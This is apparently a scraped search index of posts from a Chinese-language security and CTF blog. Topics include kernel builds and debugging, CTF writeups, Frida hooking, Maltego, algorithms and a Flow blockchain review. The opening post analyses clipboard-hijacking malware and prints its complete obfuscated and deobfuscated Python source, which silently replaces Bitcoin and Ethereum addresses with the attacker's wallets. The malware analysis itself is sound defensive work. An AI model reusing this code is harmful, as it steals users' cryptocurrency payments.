= iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:] if oo000: o0OO00 = unicode().join([ unichr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) else: o0OO00 = str().join([ chr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) return eval(o0OO00)import time, re, pyperclip, subprocessif 0: ooOoO0O00 * IIiIiII11iif 0: oOo0O0Ooo * I1ii11iIi11idef I1IiI(): while 0 &lt; 1: try: o0OOO = None if 0: ooOo + Oo o0OIiiIII111iI = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=IiII) o0OOO = str(o0OIiiIII111iI.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if o0OOO != iI1Ii11111iIi and o0OOO != i1i1II: if re.match(O0oo0OO0, str(o0OOO)): pyperclip.copy(iI1Ii11111iIi) pyperclip.paste() elif re.match(I1i1iiI1, str(o0OOO)): pyperclip.copy(i1i1II) pyperclip.paste() except Exception as iiIIIII1i1iI: print(iiIIIII1i1iI) time.sleep(1) if 0: o00ooo0 / Oo00O0 returnif __name__ == O0(u'\\u0829\\u0862\\u0863\\u0872\\u0867\\u0869\\u086f\\u0861\\u0862\\u082b\\u0805'): i1i1II = '0x22f338FC26Ea71EC884256C29103122c4578EE27' iI1Ii11111iIi = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' O0oo0OO0 = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' I1i1iiI1 = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) IiII = subprocess.STARTUPINFO() IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW I1IiI() if 0: o0oooOoO0 if 0: IiIii1Ii1IIi / O0Oooo00.oo00 * I11 if 0: I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I# okay decompiling 8.61.py.pyc 有稍微混淆過的原始碼，重新命名一下變數就可以了。 123456789101112131415161718192021222324252627282930from __future__ import print_functionimport time, re, pyperclip, subprocessdef main(): while True: try: clipboard = None process = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=startupinfo) clipboard = str(process.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if clipboard != btc_address and clipboard != eth_address: if re.match(btc_address_pattern, str(clipboard)): pyperclip.copy(btc_address) pyperclip.paste() elif re.match(eth_address_pattern, str(clipboard)): pyperclip.copy(eth_address) pyperclip.paste() except Exception as err: print(err) time.sleep(1) returnif __name__ == '__main__': eth_address = '0x22f338FC26Ea71EC884256C29103122c4578EE27' btc_address = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' btc_address_pattern = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' eth_address_pattern = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW main() 他把你剪貼簿裡面符合 bitcoin 或 ethereum 地址格式的通通換成他錢包的位址。 IOC 0x22f338FC26Ea71EC884256C29103122c4578EE27 14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS","link":"/2020/08/16/clipboard-hijack/"},{"title":"【手把手教你玩 Kernel】編譯 Linux Kernel","text":"原始碼下載 可以從 www.kernel.org 下載最新的 kernel ( 我是下載 5.0.9 的 ) 12wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.0.9.tar.xzx linux-5.0.9.tar.xz 設置編譯參數 1make menuconfig 有選單可以客製化，選完之後會產生 .config 編譯 1make -j$(nproc) -j 多個程序並行編譯 make help可以用 make help 看看有哪些參數可以用 安裝 1make -j$(nproc) modules_install 安裝內核模塊 ( kernel module ) 會裝到 /lib/modules/ 1make -j$(nproc) install 安裝內核本體 會裝到 /boot 並且會自動更新 grub 下次重啟系統就會是新的內核 安裝到其他目錄1export INSTALL_PATH=/path/to/install https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html https://stackoverflow.com/questions/35931157/change-linux-kernel-installation-directory","link":"/2019/04/23/compile-kernel/"},{"title":"【手把手教你玩 Kernel】如何對 Kernel 除錯","text":"編譯 kernel 參考 Compile Kernel initramfs 12mkdir --parents initramfs/{bin,dev,etc,lib,lib64,mnt/root,proc,root,sbin,sys}cp `which busybox` initramfs/bin/ busybox 是集成了很多常用 linux 命令的工具 接下來我們需要編輯兩個檔案，initramfs/init 和 initramfs/etc/passwd init tab123456789101112131415#!/bin/busybox sh/bin/busybox mkdir -p /usr/sbin /usr/bin /sbin /bin/bin/busybox --install -smount -t proc none /procmount -t sysfs none /sysln -s /dev/console /dev/ttyS0sleep 2setsid cttyhack su rootpoweroff -f kernel 跑起來的時候會檢查是否有 initramfs，有的話就會把它 mount 在 / 然後跑 /init passwd tab1root:x:0:0::/root:/bin/sh 打包 12cd initramfsfind . -print0 | cpio --null --create --verbose --format=newc | gzip --best &gt; ../initramfs.cpio.gz qemu-system tab123456#!/bin/bashqemu-system-x86_64 -kernel ./linux-5.0.9/arch/x86_64/boot/bzImage \\ -initrd ./initramfs.cpio.gz \\ -nographic \\ -append &quot;console=ttyS0 nokaslr&quot; \\ -gdb tcp:127.0.0.1:7777 nokaslr 關掉 kernel 的位址隨機化，方便我們除錯 -gdb 開一個 gdb server 讓我們可以連上去除錯 如何跳出 qemu-systemCtrl-A X gdb 12345678(gdb) target remote :7777(gdb) set auto-load safe-path .(gdb) file ./linux-5.0.9/vmlinux(gdb) apropos lx # 顯示包含 lx 的指令 ( 從 vmlinux-gdb.py 載入的輔助函式 )lx-cmdline -- Report the Linux Commandline used in the current kernellx-cpus -- List CPU status arrayslx-dmesg -- Print Linux kernel log buffer... 因為 gdb 會自動載入一些檔案，但有些檔案可能是不可信任的 set auto-load safe-path 就是設定可以信任的路徑，底下的檔案會自動載入，比如說一些 python script 這裡我們要載入的是 ./linux-5.0.9/vmlinux-gdb.py https://blog.csdn.net/DrottningholmEast/article/details/76651580 https://wiki.gentoo.org/wiki/Custom_Initramfs http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ https://blog.csdn.net/chrisniu1984/article/details/3907874","link":"/2019/04/23/debug-kernel/"},{"title":"【CTF Writeups】VolgaCTF Quals 2020 - F-Hash","text":"這題給了一個 x86-64 ELF Executable，直接跑下去跑不出來，一直卡在那裡，逆向一下會發現 13B0 這個函式是一個遞迴函式，他的虛擬碼大概長下面這樣，會一直遞迴呼叫前兩層的答案，很明顯的有很多重複的子問題，這時候就是要用 Dynamic Programming 的思路來把算過的答案記下來就不會跑那麼久了，所以這題就是要優化這個函式，把程式跑完就會印出 flag。 12345def _13B0(depth, a, b): ... r1 = _13B0(depth - 1, a, b) r2 = _13B0(depth - 2, a, b) ... 以下提供三種解法，讀者可以跟著練習一下。 Rewrite Function with Python 最直覺的方法就是把 IDA decompile 出來的 code 搬到 python 上重寫一下，沒什麼技術，這是我在賽中用的方法，但就是要注意一下型態的問題，比如兩個 unsigned int 相乘可能 overflow 在 python 裡面要 mod (1 &lt;&lt; 32)，更多細節請看下面的程式碼。 solve-rewrite.py123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3table = [0]for i in range(26): table += [i * 10 + 1 + (0xf6 &lt;&lt; 120)] * 10def bitcountsum(a, b): a %= (1 &lt;&lt; 64) b %= (1 &lt;&lt; 64) return bin(a).count('1') + bin(b).count('1')def calc(a, b, depth = 256): ans = [0] ans.append((bitcountsum(a, b), 0, 0)) ans.append((bitcountsum(a ^ 1, b), 0, 1)) for i in range(3, depth + 1): v15, v16 = ans[i - 1], ans[i - 2] v13 = ((v15[0] + v15[1] * (1 &lt;&lt; 64)) + (v16[0] + v16[1] * (1 &lt;&lt; 64)) + bitcountsum((v15[2] + v16[2]) ^ a, b)) % (1 &lt;&lt; 128) v14 = table[i] while True: if (v14 &gt;&gt; 64) &gt; (v13 &gt;&gt; 64): break if (v14 &gt;&gt; 64) == (v13 &gt;&gt; 64): if v14 % (1 &lt;&lt; 64) &gt;= v13 % (1 &lt;&lt; 64): break k = max(1, (v13 &gt;&gt; 64) // (v14 &gt;&gt; 64)) v13 = (v13 - k * v14) % (1 &lt;&lt; 128) ans.append((v13 % (1 &lt;&lt; 64), (v13 &gt;&gt; 64), (v15[2] + v16[2]) % (1 &lt;&lt; 64))) return ansal = [0x6369757120656854, 0x706d756a20786f66, 0x20797a616c206568, 0]bl = [0x206e776f7262206b, 0x74207265766f2073, 0x80676f64, 0x2b]for a, b in zip(al, bl): print(list(map(hex, calc(a, b)[256]))) GDB 另一個方法是我在賽後看 別人 用的，在 gdb 寫 python 去 hook 13B0 的開頭和結尾，在開頭判斷這組參數有沒有出現過了，跑過就把參數的 depth 設成 1 也就是 base case 讓他不要再往下遞迴了，而因為同一組函式的 Start, End Hook 沒辦法共享資訊，所以需要維護一個 state 來放目前的參數，在結尾的時候一樣是看這組參數有沒有出現過，有就把答案寫上去，沒有就把答案存起來下次就不會再跑一次了。 solve-gdb.py12345678910111213141516171819202122232425262728293031323334353637383940import gdbdef register(name): return int(gdb.parse_and_eval(name))def read(address, size): inf = gdb.inferiors()[0] return inf.read_memory(address, size).tobytes()def write(address, buf): inf = gdb.inferiors()[0] inf.write_memory(address, buf)memory = {}state = []class Start(gdb.Breakpoint): def __init__(self, location): super(Start, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): state.append((register('$rdi'), register('$rsi'), register('$rdx'), register('$rcx'))) if memory.get(state[-1][1:]) is not None: gdb.execute('set $rsi = 1')class End(gdb.Breakpoint): def __init__(self, location): super(End, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): global state buf, h = state[-1][0], state[-1][1:] if memory.get(h) is None: memory[h] = (read(buf, 8), read(buf + 8, 8), read(buf + 16, 8)) else: write(buf, memory[h][0]) write(buf + 8, memory[h][1]) write(buf + 16, memory[h][2]) state = state[:-1]Start(f'*{0x0000555555554000 + 0x13b0}')End(f'*{0x0000555555554000 + 0x1424}') gdb f-hash 之後，在 gdb 裡面執行 source solve-gdb.py 就可以跑上面的程式碼了 或是也可以在執行 gdb 的時候就載入 gdb -x solve-gdb.py f-hash Frida 這個方法也是我賽後看 別人 用的，frida 真的是好東西，之前剛好有研究一點 frida，第一次用在比賽中，基本上跟前一個解法一樣去 hook 函式的開頭和結尾，不過 frida 又更方便了，請看下面程式碼。 solve-frida.js12345678910111213141516171819202122var base = ptr(Process.enumerateModulesSync()[0].base)var recursive_func_ptr = base.add(0x13b0)var mem = {}Interceptor.attach(recursive_func_ptr, { onEnter: function (args) { this.buf = args[0] this.hash = args[1] + '-' + args[2] + '-' + args[3] if (mem[this.hash] !== undefined) { args[1] = ptr(1) } }, onLeave: function (retval) { if (mem[this.hash] === undefined) { mem[this.hash] = [this.buf.readU64(), this.buf.add(8).readU64(), this.buf.add(16).readU64()] } else { this.buf.writeU64(mem[this.hash][0]) this.buf.add(8).writeU64(mem[this.hash][1]) this.buf.add(16).writeU64(mem[this.hash][2]) } }}) 最後執行 frida --no-pause --runtime=v8 -l solve-frida.js ./f-hash 就可以了 Flag 1VolgaCTF{16011432ba16efc8dcf779477985b3b9} https://github.com/OAlienO/CTF/tree/master/2020/VolgaCTF/F-Hash https://pastebin.com/Dj6wteXk https://sectt.github.io/writeups/Volga20/f-hash/README","link":"/2020/05/04/f-hash/"},{"title":"【演算法筆記】Fermat&#39;s Factorization Method","text":"有一個奇合數 $n$ ，是兩個奇質數的乘積 $n = pq$ 令 $a = \\frac{p + q}{2}, b = \\frac{p - q}{2}$ 那麼 $n = (a + b)(a - b) = a^2 - b^2$ 但是今天我們不知道 $p, q$ ，而我們想要分解 $n$ 那我們就猜 $a = \\lceil \\sqrt{n} \\rceil$ ，測試 $a^2 - n$ 是不是完全平方數 猜到的話可以從 $a, b$ 反推回 $p, q$ 沒猜到就把 $a$ 加一繼續猜 使用條件 當 $|p-q|$ 很小，可以有效的分解合數 $n$ 程式碼 ( python ) 1234567891011import mathimport gmpy2def fermat(n): a = math.ceil(math.sqrt(n)) b2 = a * a - n while not gmpy2.iroot(b2, 2)[1]: a = a + 1 b2 = a * a - n b = math.sqrt(b2) return [a + b, a - b]","link":"/2018/02/22/fermat/"},{"title":"【項目介紹】Flow ( Dapper Labs )","text":"這個項目算是很新的項目，去年的 9/22 - 10/3 才在第一波 ICO，每人限購 1000 USDC，當時 ICO 的價格是一顆 FLOW 要價 0.1 USDC，到現在也漲了 200 倍了吧，只恨沒有買更多啊 Orz 不過要鎖倉一年，所以要到今年底才拿的回來，但是光是產生的利息就已經回本好幾倍了xD 好了，廢話不多說，下面來介紹一下 flow 的特點。 資源 這邊先放幾個連結，有興趣入門的可以看一下 官方寫的入門文章 官方的文檔 國外大佬的入坑指南 特點 Flow 是專門為應用程式以及遊戲所開發的一條新的區塊鍊 在鍊上面可以用 Cadence 這個程式語言撰寫 smart contract，對比隔壁棚的 Ethereum 用 Solidity 寫 smart contract Cadence 這個程式語言有什麼特點呢 Resource-Oriented Programming 聽說是參考 facebook 的 Libra 用的 Move 語言 跟 Rust 的 ownership 很像 可以看看下面兩篇 papers，在講怎麼樣設計一個適合用在 smart contract 上的語言 Obsidian: A Safer Blockchain Programming Language Resource-Aware Session Types for Digital Contracts Upgradable Smart Contract 多了一個 beta state 可以讓你盡情的 upgrade，在這個階段，如果使用這要用就要自行承擔風險囉，話是這樣說的 等到都測試完後，就可以正式 release 了，之後就跟隔壁棚 Ethereum 的 smart contract 一樣就不能再改他了 Built-in Logging Support 只會在 transaction 上標記一個記號，你想要看 log 就自己在離線執行一次就可以看到了，不像隔壁棚 Ethereum 把 log 儲存在鍊上面 在 Cadence 語言中就直接 log(&quot;hi&quot;) 就可以印 log 了，不像隔壁棚 Ethereum 還要先定義 event 再 emit Flow 這條區塊鍊有哪些特點呢 垂直分工 ( pipeline )，把問題切成四份，某種問題會有一種專門的節點負責處理 不像隔壁棚 Ethereum 尋求 sharding 的解決方式，用平行分工把所有交易切成很多子鍊，多了很多問題 分下面四種工作 Consensus Nodes : 共識機制在此發功，Flow 使用 HotStuff 共識機制 Verification Nodes : 檢查正確性，取締違規者 Execution Nodes : 執行交易附帶的那些計算工作，也就是 smart contract 裡面的程式 Collection Nodes : 負責包裝交易們處理些雜事，再丟給 Consensus Nodes，用來提昇整體區塊鍊的效率 總而言之 Consensus 和 Verification 這兩種 Node 是安全守門員負責讓 Flow 更安全 Execution 和 Collection 這兩種 Node 是瘋狂機器人負責讓 Flow 更有效率跑得更快 每個帳號裡面都可以有多個 smart contract，不像隔壁棚 Ethereum 的 smart contract 和 address 是一對一的關係 內建支援 multi-signature，每個 key 會有一個 weight，只有你提供的 key 們的 weight 加起來有 1000 就可以做事情了 聽官網介紹是說有帳號恢復機制，不清楚細節 強調說他遵守了資料庫系統的 ACID ( Atomic, Consistent, Isolated, and Durable ) 原則，因為根本上區塊鍊就是一個去中心化的資料庫 如何成為節點 官方的文檔 - Setting Up a Flow Node NODE TYPE CPU MEMORY DISK Collection 2 cores 16 GB 200 GB Consensus 2 coresv 16 GB 200 GB Execution 16 cores 128 GB 2 TB Verification 2 cores 16 GB 200 GB Access 2 cores 16 GB 200 GB Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better. 硬體要求還行，我的桌機好像還能跑，但是這個網速要求有點高啊 而且還要填表單申請，太中心化了啊 然後這裡有寫每種 node 要跑得話要 stake 多少顆 flow，最便宜也至少要 stake 135000 顆 flow，以目前的價格來看大概是 270 萬美金吧，我去 Flow 目前的一些問題 目前 Flow 還在初期階段，有些東西還沒搞好 下面一些資訊是我在 discord 群看到的 we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it won’t happen until fees are in place on mainnet. qvvg on discord 主網路還沒好啊，不能隨意創帳號 需要他們合作的夥伴像是 blockto 才能創，可以用 https://port.onflow.org/ 這個創帳號的樣子 還不夠去中心化啊 Flow’s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all. Flow Assistant Bot on discord 手續費的機制也還沒弄好啊 Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if you’d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo https://github.com/onflow/flow/issues and feel free to create or comment on issues for anything that you think should exist on Flow. Flow Assistant Bot on discord 沒有正式的 roadmap Flow 的應用 NBA Top Shot: NBA 主題的 NFT，可以讓你收藏你最愛的球員，以及他們得分的片段等 VIV3: 買賣 NFT 的平台 MotoGP™ Ignition: 類似 Ethereum 上的 F1® Delta Time，同一批開發人員的樣子，只是從 F1 賽車改成 MotoGP 摩托車，可以組裝自己的車車然後跟別人比賽，下個月 3/26 開賣 CryptoKitties: 還在計畫從 Ethereum 遷移到 Flow，不知道是哪時候 總結 Flow 提出了很多方案來改進去中心化應用面臨到的問題，接下來就要靜待時間的考驗，等潮水退了就知道 Flow 有沒有穿褲子了 Flow to the Moon 🚀","link":"/2021/02/27/flow/"},{"title":"【安卓逆向】Frida Hook 動態調試","text":"今天我們要來練習用 frida 在 Android 上做動態調試 逆之呼吸壹之型 - 一般函式 先來寫個簡單的範例 APP 有一個按扭和一個輸入欄，輸入名字之後，按下按鈕，就會顯示 Hello 加上你輸入的名字 不會寫 APP 的小朋友可以先去 youtube 上找教學，有一大堆 MainActivity.java1234567891011121314151617181920212223242526272829303132package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); resultTextView.setText(say(something)); } }); } String say (String something) { return &quot;Hello &quot; + something; }} python 負責呼叫 frida api 做注入，javascript 是被注入進去做事的 我們的目標是 hook 函式 say，並在原本的輸出文字後面加上 !!! hook.py1234567891011121314151617import fridadef on_message(message, payload): print(message)device = frida.get_usb_device()pid = device.spawn([&quot;com.example.myapplication&quot;])session = device.attach(pid)with open(&quot;script.js&quot;) as f: script = session.create_script(f.read()) script.on(&quot;message&quot;, on_message) script.load()device.resume(pid)input() script.js1234567Java.perform(() =&gt; { main = Java.use(&quot;com.example.myapplication.MainActivity&quot;) main.say.implementation = function (something) { var ret = this.say(something) return ret + '!!!' }}) 逆之呼吸貳之型 - 重載函式 改一下範例 APP，多加上一個接受數字做輸入的 say 函式 接收到數字後，就輸出 Hello 加上輸入的數字的平方 MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return &quot;Hello &quot; + something; } String say (Integer number) { number = number * number; return &quot;Hello &quot; + number.toString(); }} 兩個 say 都是一樣的名字，所以 hook 的時候要用 overload 去區分，overload 參數放的是目標函式輸入參數的型態 這次我們在新的 say 函式的輸出文字後面加上 ??? hook.py 跟上一個例子一樣就不再貼一次了 script.js1234567891011Java.perform(() =&gt; { main = Java.use(&quot;com.example.myapplication.MainActivity&quot;) main.say.overload(&quot;java.lang.String&quot;).implementation = function (something) { var ret = this.say(something) return ret + '!!!' } main.say.overload(&quot;java.lang.Integer&quot;).implementation = function (number) { var ret = this.say(number) return ret + '???' }}) 逆之呼吸參之型 - 隱藏函式 再改一下範例 APP，多加上一個變數 secret 和一個函式 getSecret，在 onCreate 裡面會給 secret 一個隨機值，我們的目標就是找出這個值 MainActivity.java12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.example.myapplication;import androidx.appcompat.app.AppCompatActivity;import android.os.Bundle;import android.view.View;import android.widget.Button;import android.widget.EditText;import android.widget.TextView;public class MainActivity extends AppCompatActivity { private int secret; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); secret = (int) (Math.random() * 100); Button sayButton = findViewById(R.id.sayButton); sayButton.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { EditText somethingEditText = findViewById(R.id.somethingEditText); TextView resultTextView = findViewById(R.id.resultTextView); String something = somethingEditText.getText().toString(); try { Integer number = Integer.parseInt(something); resultTextView.setText(say(number)); } catch (NumberFormatException e) { resultTextView.setText(say(something)); } } }); } String say (String something) { return &quot;Hello &quot; + something; } String say (Integer number) { number = number * number; return &quot;Hello &quot; + number.toString(); } int getSecret () { return secret; }} 因為我們的目標不是自己 new 一個物件出來抓 secret，這樣就只是一個我們自己就可以生成的隨機值而已 我們是要找出目前已經存在的那個 instance 的 secret，在實際例子中可能就會是一組隨機生成的密碼之類的 所以我們要用到 Java.choose 去抓 instance，抓到 instance 後，可以 instance.getSecret() 呼叫函式搞定 instance.secret.value 存取變數搞定 然後用 send 可以把資料傳到 python 端的 on_message 做處理 script.js123456789Java.perform(function () { Java.choose(&quot;com.example.myapplication.MainActivity&quot;, { onMatch: function (instance) { send(instance.getSecret()) // call function send(instance.secret.value) // access vairable }, onComplete: function () {} })}) 疑難雜症 Q : 有函式 a 跟變數 a 同名怎麼辦 ? A : a 存取函式，_a 存取變數 https://github.com/hookmaster/frida-all-in-one How to access class member variable if there’s a member function called the same name?","link":"/2020/02/16/frida/"},{"title":"【工具介紹】Maltego","text":"Maltego 是用來自動化情資蒐集的工具。 基本介紹 一開始就按 Creat a new graph 新增一個工作的圖層，就可以在上面畫出關係圖。 Entities 是基本物件，有很多種類型比如 Company, Organization, Domain, Website, …，每個物件都有幾個屬性欄位，假設你拿到某個人的手機號碼，那可以從旁邊 Entity Palette 拖曳一個 Phone Number 到右邊空白處。 Transforms 就是一個可以重複使用的函式，比如已經有了手機號碼，那就去某個網站上爬手機號碼對應的國家之類的，把這個爬的步驟寫成一個 transform，就可以自動化去從已知的資料生更多相關的資料。Local Transform 是自己寫的函式，也有別人寫好的在 Transform Hub 上面。 Local Transforms 跟著官方文件 maltego docs 做就可以大概了解怎麼用 python 去寫 Local Transforms 了。 12pip install maltego-trxmaltego-trx start new_project 先安裝 python 套件，再用 maltego-trx 去初始化一個 project transforms/TaxIDToCompany.py123456789101112import jsonimport requestsfrom maltego_trx.entities import Personfrom maltego_trx.transform import DiscoverableTransformclass TaxIDToCompany(DiscoverableTransform): @classmethod def create_entities(cls, request, response): taxid = request.Properties['properties.taxid'] r = requests.get(f'http://company.g0v.ronny.tw/api/show/{taxid}') result = json.loads(r.text) response.addEntity('maltego.Company', result['data']['公司名稱']) 主要就是繼承 DiscoverableTransform 然後填寫 create_entities 這個函式，request 裡面就有執行 transform 的那個 entity 的資訊，然後這裡是用統一編號 ( TaxID ) 去找公司名稱，然後新增一個公司的 Entity。 原本沒有 TaxID 這個 Entity 要先去 New Entity Type 新增一個 TaxID。 company.g0v.ronny.tw 回傳的資訊有很多，可以把那些資訊都加進來，可是我就懶。 寫完之後要把 Local Transform 加進去，有幾個欄位要注意， Input entity type : 要填這個 transform 要對哪一種 entity 做操作 Command : 我們是用 python api 所以要填 python 的 PATH，在 linux 上可以用 which python 找 Parameters : 填 project.py local TaxIDToCompany，project.py 是初始化 project 完會產生的腳本，local 指的就是 Local Transform，TaxIDToCompany 是你 transform 的名字，就是那個檔名的部分吧 Working directory: Project 的路徑，就是要有 project.py 的那個地方 最後按下 Run 跑完 transform 之後，就會自動新增一個 Company 的 Entity。","link":"/2020/07/31/maltego/"},{"title":"【演算法筆記】莫隊算法","text":"問題敘述 給一大小 $N$ 的序列，回答 $M$ 次查詢，每次查詢都是問一個區間 $[L, R]$ 的答案（比如區間眾數） 使用條件 可以在很短的時間內由 $[L, R]$ 得到 $[L, R + 1], [L - 1, R], [L, R - 1], [L + 1, R]$ 的答案 可以離線運算（也就是可以把輸入通通吃進來再輸出） 算法 將 $M$ 次查詢根據 $L$ 的大小分為 $\\sqrt{N}$ 塊 也就是每塊裡面的 $L$ 最多只會差距 $\\sqrt{N}$ 每塊裡面的 $R$ 再由小到大排序 按照排好的順序算答案，缺少什麼就一個個加進來，多了什麼就一個個丟掉 add 函式就是實作把一個數加進目前的區間 sub 函式就是實作把一個數從目前的區間丟掉 123456struct Q { int l, r, b, i; bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) : b &lt; q.b; }} q[MAXM]; 1234567891011int block = ceil(sqrt(MAXN));for (int i = 0; i &lt; m; i++) { int l, r; cin &gt;&gt; l &gt;&gt; r; q[i].l = l; q[i].r = r; q[i].b = q[i].l / block; q[i].i = i;}sort(q, q + m); 1234567for (int i = 0, L = 0, R = -1; i &lt; m; i++) { while (R &lt; q[i].r) add(a[++R]); while (q[i].l &lt; L) add(a[--L]); while (q[i].r &lt; R) sub(a[R--]); while (L &lt; q[i].l) sub(a[L++]); ans[q[i].i] = cur;} 時間複雜度 $O(N^{1.5})$ 奇偶優化 第一塊的 $R$ 從小到大 第二塊從 $R$ 大到小 第三塊從 $R$ 小到大 在從第一塊要到第二塊的時候，$R$ 都是大的 在從第二塊要到第三塊的時候，$R$ 都是小的 123bool operator &lt; (const Q &amp;q) { return b == q.b ? (r &lt; q.r) ^ (b % 2) : b &lt; q.b;} 題目 Codeforces 86D - Powerful array http://sunmoon-template.blogspot.com/2015/08/mos-algorithm.html https://zhuanlan.zhihu.com/p/25017840 https://oi-wiki.org/misc/mo-algo/","link":"/2019/04/18/mo/"},{"title":"【CTF Writeups】TSG CTF 2019 - OPQRX","text":"Can you decrypt RSA? I’ll give a hint value, XOR. ここにRSAの暗号文がありますが、XORをあげるので、代わりに平文をください。 分數 解題人數 497 10 Writeups 題目很簡單，RSA 加密，多給了 $p \\oplus q$ 的值 $$ \\begin{align} &amp;p \\oplus q = x \\\\ &amp;p \\times q = n \\\\ \\end{align} $$ 已知 $x, n$ 求 $p, q$ 假設 $x$ 的第一個 bit 是 0，那麼 $p, q$ 的第一個 bit 只有 $(0, 0)$ 或 $(1, 1)$ 兩種可能 假設 $x$ 的第一個 bit 是 1，那麼 $p, q$ 的第一個 bit 只有 $(0, 1)$ 或 $(1, 0)$ 兩種可能 所以就直接爆搜加剪枝就過了，驚不驚喜，意不意外 Final Exploit 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python3from Crypto.Util.number import *from tqdm import tqdmclass Solver: def __init__(self, x, n): self.x = x self.n = n self.pq = [(0, 0)] def add(self, b, p, q): if p * q &lt;= n and (p | (b - 1)) * (q | (b - 1)) &gt;= n: self.pq.append((p, q)) def solve(self): for shift in tqdm(range(4095, -1, -1)): b = 1 &lt;&lt; shift pq, self.pq = self.pq, [] for p, q in pq: if self.x &amp; b: self.add(b, p | b, q) self.add(b, p, q | b) else: self.add(b, p, q) self.add(b, p | b, q | b) return self.pq[0]exec(open('flag.enc').read().lower())solver = Solver(x, n)p, q = solver.solve()r = (p - 1) * (q - 1)d = inverse(e, r)m = pow(c, d, n)print(long_to_bytes(m)) Flag 1TSGCTF{Absolutely, X should be 'S' in 'OPQRX'.} https://furutsuki.hatenablog.com/entry/2019/05/05/163313#Crypto-497pts-10-Solves-OPQRX","link":"/2019/05/06/opqrx/"},{"title":"【CTF Writeups】Teaser Confidence CTF Quals 2019 - p4fmt","text":"Kernel challs are always a bit painful. No internet access, no SSH, no file copying. You’re stuck with copy pasting base64’d (sometimes static) ELFs. But what if there was another solution? We’ve created a lightweight, simple binary format for your pwning pleasure. It’s time to prove your skills. nc p4fmt.zajebistyc.tf 30002 分數 解題人數 304 10 Writeup 題目檔案解壓縮後有三個檔案 bzImage, initramfs.cpio.gz, run.sh bzImage 是壓縮過的 linux kernel initramfs.cpio.gz 是臨時的檔案系統 run.sh 裡面用 qemu-system-x86_64 把 kernel 跑起來 不熟悉 linux kernel debug 可以參考 Debug Kernel First Glance run.sh 跑起來後就會跑 linux kernel 彈出一個 shell ls 一下可以看到三個比較重要的檔案 init, p4fmt.ko, flag 直接嘗試 cat flag 會得到 Permission denied 因為我們拿到的使用者是 pwn 而 flag 只有 root 有權限讀 init 裡面有一行 insmod /p4fmt.ko 加載 p4fmt.ko 這個內核模塊 看來我們的目標就是利用 p4fmt.ko 裡面的漏洞提權拿 root 權限，就可以 cat flag 了 前置作業 解壓 initramfs.cpio.gz 可以先用 binwalk 把 initramfs.cpio.gz 的檔案系統拉出來 12x initramfs.cpio.gzbinwalk -e initramfs.cpio 修改 init 1setsid cttyhack su root 修改 init 讓我們有 root 權限，這樣才看得到 p4fmt.ko 內核模塊載入後的位址，等等才方便下斷點 修改完重新打包 initramfs.cpio.gz 1find . -print0 | cpio 